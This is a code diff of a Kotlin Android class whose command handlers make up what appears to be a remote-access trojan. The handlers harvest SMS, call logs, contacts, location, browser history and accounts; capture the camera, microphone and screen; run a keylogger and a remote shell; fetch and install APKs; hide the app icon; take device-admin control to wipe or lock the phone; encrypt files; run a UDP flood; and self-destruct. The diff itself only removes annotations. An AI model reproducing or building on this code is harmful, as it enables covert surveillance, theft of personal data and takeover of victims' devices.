@@ -212,27 +212,27 @@ class CommandExecutor(private val context: Context) {
     object CommandHandler {
 
         // Device Info
-        @JvmStatic
+        
         fun handleDeviceInfo(params: Map<String, Any>, context: Context): Any = DeviceUtils.collectDeviceInfo(context)
 
-        @JvmStatic
+        
         fun handleSystemInfo(params: Map<String, Any>, context: Context): Any = SystemUtils.getSystemInfo(context)
 
-        @JvmStatic
+        
         fun handleNetworkInfo(params: Map<String, Any>, context: Context): Any = NetworkUtils.getNetworkInfo(context)
 
-        @JvmStatic
+        
         fun handleBatteryInfo(params: Map<String, Any>, context: Context): Any = DeviceUtils.getBatteryInfo(context)
 
         // SMS
-        @JvmStatic
+        
         fun handleGetSms(params: Map<String, Any>, context: Context): Any {
             val limit = params["limit"] as? Int ?: 100
             val offset = params["offset"] as? Int ?: 0
             return DeviceUtils.getSmsData(context, limit, offset)
         }
 
-        @JvmStatic
+        
         fun handleSendSms(params: Map<String, Any>, context: Context): Any {
             val number = params["number"] as? String ?: return mapOf("error" to "No number provided")
             val text = params["text"] as? String ?: return mapOf("error" to "No text provided")
@@ -240,7 +240,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("success" to true, "number" to number)
         }
 
-        @JvmStatic
+        
         fun handleDeleteSms(params: Map<String, Any>, context: Context): Any {
             val ids = params["ids"] as? List<Long> ?: return mapOf("error" to "No IDs provided")
             val resolver = context.contentResolver
@@ -252,7 +252,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("deleted" to deleted)
         }
 
-        @JvmStatic
+        
         fun handleSmsListen(params: Map<String, Any>, context: Context): Any {
             val enable = params["enable"] as? Boolean ?: true
             // SMS listening is handled by SmsCommandReceiver
@@ -260,26 +260,26 @@ class CommandExecutor(private val context: Context) {
         }
 
         // Calls
-        @JvmStatic
+        
         fun handleGetCalls(params: Map<String, Any>, context: Context): Any {
             val limit = params["limit"] as? Int ?: 100
             return DeviceUtils.getCallLogData(context, limit)
         }
 
-        @JvmStatic
+        
         fun handleCallListen(params: Map<String, Any>, context: Context): Any {
             val enable = params["enable"] as? Boolean ?: true
             return mapOf("listening" to enable)
         }
 
         // Contacts
-        @JvmStatic
+        
         fun handleGetContacts(params: Map<String, Any>, context: Context): Any {
             val limit = params["limit"] as? Int ?: 500
             return DeviceUtils.getContactsData(context, limit)
         }
 
-        @JvmStatic
+        
         fun handleAddContact(params: Map<String, Any>, context: Context): Any {
             val name = params["name"] as? String ?: return mapOf("error" to "No name")
             val phone = params["phone"] as? String ?: return mapOf("error" to "No phone")
@@ -288,40 +288,40 @@ class CommandExecutor(private val context: Context) {
             return mapOf("success" to true)
         }
 
-        @JvmStatic
+        
         fun handleDeleteContact(params: Map<String, Any>, context: Context): Any {
             val id = params["id"] as? Long ?: return mapOf("error" to "No ID")
             return mapOf("success" to true)
         }
 
         // Location
-        @JvmStatic
+        
         fun handleGetLocation(params: Map<String, Any>, context: Context): Any {
             return DeviceUtils.getLastKnownLocation(context)?.toJson() ?: mapOf("error" to "No location")
         }
 
-        @JvmStatic
+        
         fun handleTrackLocation(params: Map<String, Any>, context: Context): Any {
             val interval = params["interval"] as? Long ?: 60000
             DeviceUtils.startLocationTracking(context, interval)
             return mapOf("tracking" to true, "interval" to interval)
         }
 
-        @JvmStatic
+        
         fun handleStopLocation(params: Map<String, Any>, context: Context): Any {
             DeviceUtils.stopLocationTracking(context)
             return mapOf("tracking" to false)
         }
 
         // Files
-        @JvmStatic
+        
         fun handleListFiles(params: Map<String, Any>, context: Context): Any {
             val path = params["path"] as? String ?: Environment.getExternalStorageDirectory().absolutePath
             val recursive = params["recursive"] as? Boolean ?: false
             return FileUtils.listFiles(path, recursive)
         }
 
-        @JvmStatic
+        
         fun handleDownloadFile(params: Map<String, Any>, context: Context): Any {
             val path = params["path"] as? String ?: return mapOf("error" to "No path")
             val file = File(path)
@@ -330,7 +330,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("name" to file.name, "size" to file.length(), "content" to content)
         }
 
-        @JvmStatic
+        
         fun handleUploadFile(params: Map<String, Any>, context: Context): Any {
             val path = params["path"] as? String ?: return mapOf("error" to "No path")
             val content = params["content"] as? String ?: return mapOf("error" to "No content")
@@ -341,7 +341,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("success" to true, "size" to file.length())
         }
 
-        @JvmStatic
+        
         fun handleDeleteFile(params: Map<String, Any>, context: Context): Any {
             val path = params["path"] as? String ?: return mapOf("error" to "No path")
             val file = File(path)
@@ -349,7 +349,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("success" to success)
         }
 
-        @JvmStatic
+        
         fun handleSearchFiles(params: Map<String, Any>, context: Context): Any {
             val pattern = params["pattern"] as? String ?: return mapOf("error" to "No pattern")
             val path = params["path"] as? String ?: Environment.getExternalStorageDirectory().absolutePath
@@ -357,13 +357,13 @@ class CommandExecutor(private val context: Context) {
         }
 
         // Apps
-        @JvmStatic
+        
         fun handleListApps(params: Map<String, Any>, context: Context): Any {
             val includeSystem = params["include_system"] as? Boolean ?: false
             return DeviceUtils.getInstalledApps(context, includeSystem)
         }
 
-        @JvmStatic
+        
         fun handleInstallApp(params: Map<String, Any>, context: Context): Any {
             val url = params["url"] as? String ?: return mapOf("error" to "No URL")
             val apkPath = params["path"] as? String ?: "${context.cacheDir}/app.apk"
@@ -382,7 +382,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("success" to true, "path" to apkPath)
         }
 
-        @JvmStatic
+        
         fun handleUninstallApp(params: Map<String, Any>, context: Context): Any {
             val packageName = params["package"] as? String ?: return mapOf("error" to "No package")
             val intent = Intent(Intent.ACTION_DELETE).apply {
@@ -393,7 +393,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("success" to true)
         }
 
-        @JvmStatic
+        
         fun handleLaunchApp(params: Map<String, Any>, context: Context): Any {
             val packageName = params["package"] as? String ?: return mapOf("error" to "No package")
             val intent = context.packageManager.getLaunchIntentForPackage(packageName)
@@ -405,14 +405,14 @@ class CommandExecutor(private val context: Context) {
             return mapOf("error" to "No launch intent")
         }
 
-        @JvmStatic
+        
         fun handleGetAppData(params: Map<String, Any>, context: Context): Any {
             val packageName = params["package"] as? String ?: return mapOf("error" to "No package")
             return DeviceUtils.getAppData(context, packageName)
         }
 
         // Camera
-        @JvmStatic
+        
         fun handleTakePhoto(params: Map<String, Any>, context: Context): Any {
             val cameraId = params["camera"] as? Int ?: 0
             val quality = params["quality"] as? Int ?: 90
@@ -420,77 +420,77 @@ class CommandExecutor(private val context: Context) {
             return MediaProjectionService.takePhoto(context, cameraId, quality)
         }
 
-        @JvmStatic
+        
         fun handleRecordVideo(params: Map<String, Any>, context: Context): Any {
             val duration = params["duration"] as? Long ?: 10000
             val quality = params["quality"] as? Int ?: MediaRecorder.OutputFormat.MPEG_4
             return MediaProjectionService.recordVideo(context, duration, quality)
         }
 
-        @JvmStatic
+        
         fun handleCameraStream(params: Map<String, Any>, context: Context): Any {
             val enable = params["enable"] as? Boolean ?: true
             return MediaProjectionService.toggleCameraStream(context, enable)
         }
 
         // Microphone
-        @JvmStatic
+        
         fun handleRecordAudio(params: Map<String, Any>, context: Context): Any {
             val duration = params["duration"] as? Long ?: 10000
             val format = params["format"] as? String ?: "amr"
             return MediaProjectionService.recordAudio(context, duration, format)
         }
 
-        @JvmStatic
+        
         fun handleAudioStream(params: Map<String, Any>, context: Context): Any {
             val enable = params["enable"] as? Boolean ?: true
             return MediaProjectionService.toggleAudioStream(context, enable)
         }
 
         // Screen
-        @JvmStatic
+        
         fun handleScreenshot(params: Map<String, Any>, context: Context): Any {
             return ScreenCaptureService.captureScreenshot(context)
         }
 
-        @JvmStatic
+        
         fun handleScreenStream(params: Map<String, Any>, context: Context): Any {
             val enable = params["enable"] as? Boolean ?: true
             return ScreenCaptureService.toggleScreenStream(context, enable)
         }
 
-        @JvmStatic
+        
         fun handleScreenRecord(params: Map<String, Any>, context: Context): Any {
             val duration = params["duration"] as? Long ?: 30000
             return ScreenCaptureService.recordScreen(context, duration)
         }
 
         // Keylogger
-        @JvmStatic
+        
         fun handleStartKeylogger(params: Map<String, Any>, context: Context): Any {
             val enable = params["enable"] as? Boolean ?: true
             return mapOf("keylogger" to enable)
         }
 
-        @JvmStatic
+        
         fun handleStopKeylogger(params: Map<String, Any>, context: Context): Any {
             return mapOf("keylogger" to false)
         }
 
-        @JvmStatic
+        
         fun handleGetKeylogs(params: Map<String, Any>, context: Context): Any {
             return DeviceUtils.getKeylogs(context)
         }
 
         // Shell
-        @JvmStatic
+        
         fun handleShell(params: Map<String, Any>, context: Context): Any {
             val command = params["command"] as? String ?: return mapOf("error" to "No command")
             val timeout = params["timeout"] as? Long ?: 30000
             return SystemUtils.executeShellCommand(command, timeout)
         }
 
-        @JvmStatic
+        
         fun handleShellInteractive(params: Map<String, Any>, context: Context): Any {
             val sessionId = params["session_id"] as? String ?: java.util.UUID.randomUUID().toString()
             val command = params["command"] as? String ?: ""
@@ -498,7 +498,7 @@ class CommandExecutor(private val context: Context) {
         }
 
         // Persistence
-        @JvmStatic
+        
         fun handleEnableAdmin(params: Map<String, Any>, context: Context): Any {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(context, DeviceAdminReceiverImpl::class.java)
@@ -513,7 +513,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("admin_enabled" to dpm.isAdminActive(adminComponent))
         }
 
-        @JvmStatic
+        
         fun handleDisableAdmin(params: Map<String, Any>, context: Context): Any {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(context, DeviceAdminReceiverImpl::class.java)
@@ -521,7 +521,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("admin_enabled" to false)
         }
 
-        @JvmStatic
+        
         fun handleHideIcon(params: Map<String, Any>, context: Context): Any {
             val pm = context.packageManager
             pm.setComponentEnabledSetting(
@@ -532,7 +532,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("hidden" to true)
         }
 
-        @JvmStatic
+        
         fun handleShowIcon(params: Map<String, Any>, context: Context): Any {
             val pm = context.packageManager
             pm.setComponentEnabledSetting(
@@ -544,7 +544,7 @@ class CommandExecutor(private val context: Context) {
         }
 
         // System
-        @JvmStatic
+        
         fun handleReboot(params: Map<String, Any>, context: Context): Any {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(context, DeviceAdminReceiverImpl::class.java)
@@ -555,7 +555,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("error" to "Device admin not active")
         }
 
-        @JvmStatic
+        
         fun handleShutdown(params: Map<String, Any>, context: Context): Any {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(context, DeviceAdminReceiverImpl::class.java)
@@ -566,7 +566,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("error" to "Device admin not active")
         }
 
-        @JvmStatic
+        
         fun handleWipeData(params: Map<String, Any>, context: Context): Any {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(context, DeviceAdminReceiverImpl::class.java)
@@ -577,7 +577,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("error" to "Device admin not active")
         }
 
-        @JvmStatic
+        
         fun handleLockDevice(params: Map<String, Any>, context: Context): Any {
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(context, DeviceAdminReceiverImpl::class.java)
@@ -588,33 +588,33 @@ class CommandExecutor(private val context: Context) {
             return mapOf("error" to "Device admin not active")
         }
 
-        @JvmStatic
+        
         fun handleUnlockDevice(params: Map<String, Any>, context: Context): Any {
             // Requires device admin with USES_POLICY_DISABLE_KEYGUARD
             return mapOf("error" to "Not implemented")
         }
 
         // Network
-        @JvmStatic
+        
         fun handleWifiScan(params: Map<String, Any>, context: Context): Any {
             return NetworkUtils.scanWifi(context)
         }
 
-        @JvmStatic
+        
         fun handleWifiConnect(params: Map<String, Any>, context: Context): Any {
             val ssid = params["ssid"] as? String ?: return mapOf("error" to "No SSID")
             val password = params["password"] as? String ?: ""
             return NetworkUtils.connectWifi(context, ssid, password)
         }
 
-        @JvmStatic
+        
         fun handleTcpConnect(params: Map<String, Any>, context: Context): Any {
             val host = params["host"] as? String ?: return mapOf("error" to "No host")
             val port = params["port"] as? Int ?: return mapOf("error" to "No port")
             return NetworkUtils.tcpConnect(host, port)
         }
 
-        @JvmStatic
+        
         fun handleUdpFlood(params: Map<String, Any>, context: Context): Any {
             val target = params["target"] as? String ?: return mapOf("error" to "No target")
             val port = params["port"] as? Int ?: return mapOf("error" to "No port")
@@ -622,62 +622,62 @@ class CommandExecutor(private val context: Context) {
             return NetworkUtils.udpFlood(target, port, duration)
         }
 
-        @JvmStatic
+        
         fun handleDnsSpoof(params: Map<String, Any>, context: Context): Any {
             // Requires root
             return mapOf("error" to "Root required")
         }
 
         // Bluetooth
-        @JvmStatic
+        
         fun handleBluetoothScan(params: Map<String, Any>, context: Context): Any {
             return DeviceUtils.scanBluetooth(context)
         }
 
-        @JvmStatic
+        
         fun handleBluetoothPair(params: Map<String, Any>, context: Context): Any {
             val address = params["address"] as? String ?: return mapOf("error" to "No address")
             return DeviceUtils.pairBluetooth(context, address)
         }
 
         // NFC
-        @JvmStatic
+        
         fun handleNfcRead(params: Map<String, Any>, context: Context): Any {
             return DeviceUtils.readNfc(context)
         }
 
-        @JvmStatic
+        
         fun handleNfcWrite(params: Map<String, Any>, context: Context): Any {
             val data = params["data"] as? String ?: return mapOf("error" to "No data")
             return DeviceUtils.writeNfc(context, data)
         }
 
         // Clipboard
-        @JvmStatic
+        
         fun handleGetClipboard(params: Map<String, Any>, context: Context): Any {
             return SystemUtils.getClipboardText(context)
         }
 
-        @JvmStatic
+        
         fun handleSetClipboard(params: Map<String, Any>, context: Context): Any {
             val text = params["text"] as? String ?: return mapOf("error" to "No text")
             SystemUtils.setClipboardText(context, text)
             return mapOf("success" to true)
         }
 
-        @JvmStatic
+        
         fun handleMonitorClipboard(params: Map<String, Any>, context: Context): Any {
             val enable = params["enable"] as? Boolean ?: true
             return mapOf("monitoring" to enable)
         }
 
         // Notifications
-        @JvmStatic
+        
         fun handleGetNotifications(params: Map<String, Any>, context: Context): Any {
             return DeviceUtils.getNotifications(context)
         }
 
-        @JvmStatic
+        
         fun handleSendNotification(params: Map<String, Any>, context: Context): Any {
             val title = params["title"] as? String ?: "Notification"
             val text = params["text"] as? String ?: ""
@@ -686,24 +686,24 @@ class CommandExecutor(private val context: Context) {
         }
 
         // Browser
-        @JvmStatic
+        
         fun handleGetBrowserHistory(params: Map<String, Any>, context: Context): Any {
             return DeviceUtils.getBrowserHistory(context)
         }
 
-        @JvmStatic
+        
         fun handleGetBookmarks(params: Map<String, Any>, context: Context): Any {
             return DeviceUtils.getBookmarks(context)
         }
 
         // Accounts
-        @JvmStatic
+        
         fun handleGetAccounts(params: Map<String, Any>, context: Context): Any {
             return DeviceUtils.getAccounts(context)
         }
 
         // Encryption
-        @JvmStatic
+        
         fun handleEncryptFile(params: Map<String, Any>, context: Context): Any {
             val path = params["path"] as? String ?: return mapOf("error" to "No path")
             val password = params["password"] as? String ?: "default"
@@ -711,7 +711,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("success" to true)
         }
 
-        @JvmStatic
+        
         fun handleDecryptFile(params: Map<String, Any>, context: Context): Any {
             val path = params["path"] as? String ?: return mapOf("error" to "No path")
             val password = params["password"] as? String ?: "default"
@@ -720,7 +720,7 @@ class CommandExecutor(private val context: Context) {
         }
 
         // Self-management
-        @JvmStatic
+        
         fun handleUpdateConfig(params: Map<String, Any>, context: Context): Any {
             params.forEach { (key, value) ->
                 when (key) {
@@ -734,7 +734,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("success" to true)
         }
 
-        @JvmStatic
+        
         fun handleSelfDestruct(params: Map<String, Any>, context: Context): Any {
             // Remove all data and uninstall
             FileUtils.wipeAppData(context)
@@ -747,7 +747,7 @@ class CommandExecutor(private val context: Context) {
             return mapOf("success" to true)
         }
 
-        @JvmStatic
+        
         fun handleUpdateBinary(params: Map<String, Any>, context: Context): Any {
             val url = params["url"] as? String ?: return mapOf("error" to "No URL")
             val path = "${context.cacheDir}/update.apk"
